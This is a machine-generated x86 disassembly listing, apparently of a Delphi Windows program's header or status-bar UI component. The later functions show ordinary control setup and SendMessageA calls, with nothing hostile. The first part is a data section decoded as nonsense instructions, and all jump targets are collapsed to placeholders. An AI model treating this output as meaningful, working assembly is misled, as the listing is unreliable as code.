add [ edx - 0x7010000 ] bl
jo r-xdata
adc [ eax ] al
adc al 0x2
add bh bh
call 0x143afc6
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al [ eax ]
[ eax - 0x6e ]
jns r-xdata
inc eax
add [ eax ] ah
xchg edx eax
inc ebx
add [ ebx + edx * 4 + 0x43 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax 0x61500e00
jb r-xdata
imul ebp [ edi + 0x6e ] r-xdata
0xf8ff0000 0x4470
and al 0x44
add [ eax + eax ] dh
[ eax - 0x6c ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0013 ] al
outsd
outsb
jae r-xdata
js r-xdata
add [ fs : eax ] al
add [ ecx ] dl
add [ ebx ] al
dec ebp
popad
add [ eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
je r-xdata
je r-xdata
add [ eax ] al
add [ eax + 0x53080018 ] al
push 0x6948776f
outsb
je r-xdata
outsb
je r-xdata
jo r-xdata
jb r-xdata
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a001e ] al
outsb
inc ebx
push 0x69676e61
outsb
in al 0x67
inc ebx
add [ eax ] bh
add al [ eax ]
jo r-xdata
outsd
outsb
add [ eax ] dl
inc eax
add [ ecx - 0x2b010000 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
and eax [ eax + eax + 0x40 ]
jo r-xdata
add [ eax ] al
call esp
push 0x6948776f
outsb
je r-xdata
fld [ eax + eax - 0x40 ]
fld [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc eax
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ss
add [ ecx ] cl
push eax
outsd
jo r-xdata
imul ebp [ esi + 0x74 ] 0x43669c73
add [ ecx ] ch
add al [ eax ]
jmp [ eax ]
adc [ eax ] al
push ds
sbb al [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
fld [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax + esi * 2 + 0x44 ] bl
add [ eax - 0x80000000 ] al
sbb [ eax ] al
or [ ecx + 0x6e ] ecx
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
pushad
inc ebp
add [ eax + eax ] bh
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ss
add [ eax ] cl
push eax
outsd
jae r-xdata
adc [ eax ] al
and [ edx - 0x6cbbffbd ] dl
inc ebx
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c001f ] al
outsb
inc ebx
push 0x69676e61
outsb
inc ebp
js r-xdata
popad
outsb
jae r-xdata
add al [ eax ]
dec [ edx * 4 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
sbb eax [ eax ]
or [ eax + ebp * 2 + 0x6f ] edx
jne r-xdata
add [ eax ] dl
inc eax
add [ esi ] bl
imul ebp [ esi + 0x74 ] r-xdata
and [ edx ] al
add bh bh
and [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] eax
pop es
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
rol [ ecx ] 0x0
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070022 ] al
outsb
inc ebp
outsb
je r-xdata
sub al 0x44
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0020 ] al
outsb
inc ebx
outsd
outsb
je r-xdata
adc [ eax ] al
push edi
add [ eax ] al
jmp [ esi + ebp * 2 - 0x6fffffbc ]
dec ebp
outsd
jne r-xdata
jb r-xdata
push es
dec edi
outsb
js r-xdata
outsd
insd
jo r-xdata
dec ebp
outsd
jbe r-xdata
add [ eax - 0x80000000 ] al
and eax 0x6e4f0b00
mov [ ecx ] eax
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
outsb
dec ebp
outsd
jne r-xdata
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al 0x0
or ecx [ edi + 0x6e ]
push eax
outsd
jo r-xdata
jno r-xdata
je r-xdata
punpcklwd mm6 [ esi + 0x69 ]
inc esi
imul ebp [ esi + 0x64 ] 0x706d6f43
jne r-xdata
add al 0x25
inc esp
add al ah
add [ eax ] al
jmp eax
arpl [ ecx + 0x63 ] di
push ebp
jo r-xdata
dec ebp
outsd
jne r-xdata
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
and eax 0xd00044
add bh bh
rol [ eax ] 0x1
outsd
outsb
or eax 0x46697661
inc esp
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0024 ] al
outsb
jo r-xdata
inc esp
add [ eax + 0x2 ] ah
add [ eax ] al
insb
xor eax [ eax + eax + 0x18 ]
inc edx
inc edx
add ah ah
xor eax 0x3b6c0040
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh bh
jo r-xdata
jb r-xdata
jb r-xdata
add [ eax ] dh
inc edx
inc edx
add [ eax ] bl
aas
add [ eax - 0x44 ] dl
jns r-xdata
inc ebp
js r-xdata
shl [ edi + ebp * 2 ] 0x43
add [ ebx ] al
or dl [ ebx + eax * 2 + 0x6f ]
insd
insd
outsd
outsb
inc ecx
push esi
dec ecx
add [ eax ] eax
add [ eax ] al
add [ eax ] cl
add [ eax ] al
add [ eax ] ah
outsd
inc ebx
add [ edi ] al
popad
jbe r-xdata
popad
jbe r-xdata
jl r-xdata
add [ eax ] al
and [ ebx ] 0x0
inc ebx
add [ eax ] ah
add al [ eax ]
jmp [ eax ]
add [ eax - 0x4b ] dl
inc esp
add [ ecx + ebp * 8 - 0x2c03ffbc ] cl
inc esp
add [ edi + edx * 8 ] ah
inc esp
add [ eax ] ah
0x9a400043 0x43
pushad
0x9a800043 0x43
push cs
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah dh
adc [ eax ] al
or al 0x2
add [ eax ] al
hlt
add [ eax - 0x3fffbb4f ] al
xchg edx eax
inc esp
add al bl
aad 0x44
add [ esi + edx * 8 - 0x2ea7ffbc ] dl
inc esp
add [ eax - 0x2a ] bh
inc esp
add al bl
xchg edi eax
inc esp
add [ esi + ebx * 4 + 0x44 ] ch
add [ esp + ebp * 4 ] cl
inc esp
add [ eax ] dh
xchg esi eax
inc ebx
add ah dh
test al 0x44
add [ eax ] ch
xchg edi eax
inc ebx
add [ esp + ebp * 4 - 0x5357ffbc ] ah
inc esp
add [ eax - 0x55 ] ah
inc esp
add [ edi + edx * 4 + 0x43 ] cl
add [ eax + 0x500044d7 ] bh
mov ch 0x44
add [ eax ] dl
bound eax [ eax + eax + 0x14 ]
bound eax [ eax + eax + 0x10 ]
xchg edx eax
inc esp
add [ edx + edx * 4 ] bh
inc esp
add [ ebp + ebp * 2 + 0x44 ] dl
add [ ebx + 0x6ee00044 ] cl
inc esp
add [ eax + 0x6e ] bl
inc esp
add [ ecx + esi * 2 + 0x44 ] ch
add [ eax ] bl
jo r-xdata
add [ ebp + edx * 8 + 0x44 ] cl
inc ecx
add [ edx + ebx * 4 + 0x64540043 ] ah
inc esp
add [ eax - 0x69 ] ah
add [ edx + ebp * 4 - 0x43afffbc ] ch
inc esp
add [ ebp + ebp * 2 + 0x44 ] ch
add [ edx ] ch
or esp [ ecx + 0x76 ]
imul eax [ ebx + 0x6f ] 0x69467970
insb
push cs
popad
jbe r-xdata
popad
jbe r-xdata
add ah ch
add [ ebx + edi + 0x42 ] ch
arpl [ gs : ecx + 0x63 ] di
insb
or eax 0x44697661
insb
je r-xdata
imul eax [ ebp + 0x6c ] 0x46657465
dec esi
or al 0x70
inc ebx
inc esi
imul ebp [ esi + 0x64 ] 0x656c6946
and eax 0xe00044
add bh bh
loopne r-xdata
inc esp
add al bl
add [ eax ] al
xor eax 0xb2e40040
inc esp
cmp eax [ edx ]
in al dx
insb
inc esi
imul ebp [ ebp + 0xf ] 0x45697661
insd
jo r-xdata
push edx
inc ebx
outsd
jo r-xdata
imul ebp [ ebp + 0x8 ] 0x436d6f43
je r-xdata
inc esi
inc edx
add [ eax ] dl
aas
inc edx
add [ eax ] bh
inc edx
inc edx
add [ eax - 0x2fffbc6b ] dh
fld [ eax + eax - 0x2c ]
mov eax [ 0xffffffffe2380043 ]
inc esp
add al cl
bound eax [ eax + eax + 0x4c ]
fadd [ eax + eax + 0x6c ]
fadd [ eax + eax + 0x4c ]
aad 0x44
insb
jae r-xdata
inc esp
add [ eax ] bh
jno r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : ecx ] cl
dec edi
in al 0x35
inc eax
inc esi
imul ebp [ ebp + 0x73 ] 0x6976610b
inc ebx
outsd
jo r-xdata
imul ebp [ esi + 0x64 ] 0x646c6f46
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
jo r-xdata
ror [ eax + esi * 2 ] 0x43
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
mov esp 0xbc004495
loop r-xdata
mov dl 0x44
arpl [ gs : ecx + 0x63 ] di
inc esi
imul ebp [ ebp + 0xe ] 0x52697661
sub_43749c
push ebx
add esp 0xfffffff8
mov [ esp ] 0x8
mov [ esp + 0x4 ] eax
mov eax esp
call sub_42e728
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
jne r-xdata
mov eax ebx
pop ecx
pop edx
pop ebx
retn
call InitCommonControls
sub_437545
add [ eax ] al
add [ ebx + 0x56 ] dl
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x10 ] 0x32
mov [ esi + 0x18 ] 0x2710
mov [ esi + 0x1e ] 0x1
mov [ esi + 0x20 ] 0xffffffff
mov [ esi + 0x25 ] 0x1
xor edx edx
mov eax esi
call sub_41bfa8
mov eax esi
call sub_437648
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_437548
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x10 ] 0x32
mov [ esi + 0x18 ] 0x2710
mov [ esi + 0x1e ] 0x1
mov [ esi + 0x20 ] 0xffffffff
mov [ esi + 0x25 ] 0x1
xor edx edx
mov eax esi
call sub_41bfa8
mov eax esi
call sub_437648
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_4375a4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41bc50
mov edi esi
mov edx [ edi + 0xc ]
mov eax ebx
call sub_437754
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_43777c
mov edx [ edi + 0x14 ]
mov eax ebx
call sub_437728
mov edx [ edi + 0x18 ]
mov eax ebx
call sub_437704
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_4376d4
mov dl [ edi + 0x1d ]
mov eax ebx
call sub_437744
mov al [ edi + 0x1e ]
mov [ ebx + 0x1e ] al
mov edx [ edi + 0x20 ]
mov eax ebx
call sub_4377c4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_437648
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x25 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_40358c
test eax eax
je r-xdata
mov eax ebx
mov si 0xffff
call sub_40358c
mov eax [ eax + 0x18 ]
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_43761c
mov [ ebx + 0x25 ] 0x1
sub_4376b0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0xc ]
call sub_404174
cmp [ esi ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_41c04c
sub_4376e4
push esi
mov esi eax
cmp dl [ esi + 0x1f ]
je r-xdata
pop esi
retn
mov [ esi + 0x1f ] dl
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
mov si 0xffee
call sub_40358c
sub_437754
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx esi
call sub_40452c
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0xc ]
mov edx esi
call sub_404174
xor edx edx
mov eax ebx
call sub_41c010
sub_43777c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x18 ]
cmp edx eax
jle r-xdata
mov edx eax
cmp edx [ ebx + 0x10 ]
je r-xdata
mov edx eax
pop esi
pop ebx
retn
mov [ ebx + 0x10 ] edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_41c034
mov esi eax
mov eax [ ebx + 0x4 ]
call sub_41c3c4
dec eax
cmp esi eax
setl dl
mov eax ebx
call sub_41c010
sub_4377d4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ r-xdata ]
xor edx edx
mov eax edi
call sub_41c18c
mov [ edi + 0x18 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_43783c
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov eax [ ebx + 0x18 ]
call sub_438048
pop esi
pop ebx
retn
mov eax esi
call sub_41c034
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_438024
pop esi
pop ebx
retn
sub_437868
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
test edx edx
jne r-xdata
mov esi edx
test edx edx
je r-xdata
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
mov esi eax
jmp r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax ebx
call sub_41c3c4
cmp edi eax
jge r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax ebx
call sub_41c3c4
mov edi eax
dec edi
sub_4378b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_449498
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax ebx
call sub_446498
mov edx 0x11
mov eax ebx
call sub_446764
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebx + 0x208 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_427758
mov esi eax
mov [ ebx + 0x214 ] esi
mov eax esi
mov edx ebx
call sub_445b60
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov esi eax
mov [ ebx + 0x224 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_438868
mov [ ebx + 0x220 ] 0x1
mov [ ebx + 0x222 ] 0x0
mov [ ebx + 0x211 ] 0x0
mov [ ebx + 0x210 ] 0x0
xor eax eax
mov [ ebx + 0x20c ] eax
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_437988
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax [ esi + 0x214 ]
call sub_403390
mov eax [ esi + 0x208 ]
call sub_403390
mov eax [ esi + 0x224 ]
call sub_403390
mov eax [ esi + 0x20c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4495bc
test bl bl
jle r-xdata
call sub_403390
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_4379e0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
call sub_43749c
mov edx esi
mov eax ebx
call sub_44a5f8
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_44a524
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
cmp [ ebx + 0x220 ] 0x0
je r-xdata
cmp [ ebx + 0x221 ] 0x0
je r-xdata
or [ esi + 0x4 ] 0x80
cmp [ ebx + 0x222 ] 0x0
je r-xdata
or [ esi + 0x4 ] 0x4
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x40
sub_437a58
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20c ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41c2f0
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax + 0x20c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e608
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_437ae0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_420c24
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x4 ]
call sub_41f2dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403390
retn
sub_437b0c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44a724
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x228 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20c ] 0x0
je r-xdata
mov eax ebx
call sub_45407c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_438048
push ebp
call sub_437a58
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
call sub_4541b8
push eax
mov eax [ ebp - 0x4 ]
call sub_44d7a4
pop edx
call sub_42e834
pop ebx
pop ecx
pop ebp
retn
sub_437b74
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20c ] 0x0
jne r-xdata
push 0x400
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x20c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e608
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_437c02
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x8 ]
call sub_42178c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437c09
mov eax [ ebp - 0x8 ]
call sub_403390
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_41dbc4
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20c ] eax
sub_437c18
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44cae8
mov eax ebx
call sub_44daa8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_41c3c4
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x208 ]
call sub_437824
call sub_437648
mov edx esi
mov eax [ ebx + 0x208 ]
call sub_437824
cmp [ eax + 0x25 ] 0x0
je r-xdata
sub_437c74
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44daa8
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41c3c4
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_446988
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_437824
mov eax [ eax + 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41c3c4
mov ebx eax
sub ebx 0x2
test ebx ebx
jl r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4377d4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_437dbe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41c3c4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41c3c4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx esi
call sub_437824
mov eax [ eax + 0x10 ]
sub [ ebp - 0xc ] eax
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437dc5
mov eax [ ebp - 0x10 ]
call sub_403390
retn
inc ebx
xor esi esi
mov eax [ ebp - 0x10 ]
call sub_437818
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx esi
call sub_437824
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41c3c4
mov edx eax
sub edx esi
dec edx
mov eax [ ebp - 0x10 ]
call sub_437824
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx esi
call sub_437824
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_437dc5
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41c3c4
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_438048
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_41c3c4
mov edx eax
dec edx
mov eax ebx
call sub_437824
mov edx [ ebp - 0x8 ]
call sub_43777c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_437824
mov edx [ ebp - 0xc ]
call sub_43777c
sub_437e20
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x242 ] 0x0
je r-xdata
mov edx ecx
mov eax [ eax + 0x214 ]
call sub_4279ac
push ecx
mov cl [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x244 ]
call [ ebx + 0x240 ]
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_437e9c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x25a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov cl [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x25c ]
call [ ebx + 0x258 ]
sub_437f28
push ebx
push esi
push edi
add esp 0xffffffd8
mov edi edx
mov esi eax
mov edx ecx
mov eax [ esi + 0x208 ]
call sub_437824
mov ebx eax
lea eax [ esp + 0x1 ]
xor ecx ecx
mov edx 0x24
call sub_402da4
mov [ esp + 0x1 ] 0x7
mov eax [ ebx + 0x10 ]
mov [ esp + 0x5 ] eax
mov eax [ ebx + 0xc ]
call sub_4045e0
mov [ esp + 0x9 ] eax
mov eax [ ebx + 0xc ]
call sub_4043e0
mov [ esp + 0x11 ] eax
mov al [ ebx + 0x1c ]
mov [ esp ] al
mov eax ebx
call sub_437698
test al al
je r-xdata
mov al [ esp ]
sub al 0x1
jb r-xdata
mov eax esp
call sub_443d64
xor eax eax
mov [ esp + 0x15 ] eax
jmp r-xdata
je r-xdata
cmp [ ebx + 0x1d ] 0x1
jne r-xdata
mov [ esp + 0x15 ] 0x1
jmp r-xdata
jmp r-xdata
or [ esp + 0x15 ] 0x4000
or [ esp + 0x15 ] 0x8000
jmp r-xdata
mov [ esp + 0x15 ] 0x2
cmp [ esi + 0x228 ] 0x0
je r-xdata
or [ esp + 0x15 ] 0x4
mov eax ebx
call sub_437680
test al al
je r-xdata
lea eax [ esp + 0x1 ]
push eax
mov eax ebx
call sub_41c034
push eax
push edi
mov eax esi
call sub_44d7a4
push eax
call SendMessageA
add esp 0x28
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x20 ] 0x0
jl r-xdata
or [ esp + 0x1 ] 0x20
or [ esp + 0x15 ] 0x800
mov eax [ ebx + 0x20 ]
mov [ esp + 0x1d ] eax
sub_438024
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44daa8
test al al
je r-xdata
pop esi
pop ebx
retn
mov ecx esi
mov edx 0x1204
mov eax ebx
call sub_437f28
sub_438048
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_44daa8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x210 ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x1200
mov eax esi
call sub_44d7a4
push eax
call SendMessageA
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esi + 0x208 ]
call sub_41c3c4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
inc ebx
xor edi edi
push 0x0
push 0x0
push 0x1202
mov eax esi
call sub_44d7a4
push eax
call SendMessageA
dec ebx
jne r-xdata
mov ecx edi
mov edx 0x1201
mov eax esi
call sub_437f28
inc edi
dec ebx
jne r-xdata
sub_4380c4
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
call sub_427a5c
xor eax eax
push ebp
push sub_4381c5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
call sub_427dd0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
call sub_427c70
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_427608
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
mov eax [ eax + 0x14 ]
xor edx edx
call sub_427724
mov eax [ ebp - 0x10 ]
test [ eax + 0x10 ] 0x1
setne al
push eax
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_437824
mov edx eax
mov eax [ ebp - 0x10 ]
lea ecx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_40358c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4381cc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
xor edx edx
call sub_427dd0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
call sub_427c48
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
sub_4381dc
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov esi [ edx + 0x8 ]
mov eax [ esi + 0x8 ]
cmp eax 0xfffffed2
jg r-xdata
sub eax 0xfffffed3
je r-xdata
je r-xdata
mov eax [ esi + 0x14 ]
test [ eax ] 0x1
je r-xdata
sub eax 0x11d
je r-xdata
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_437824
mov edx eax
mov eax [ ebp - 0x4 ]
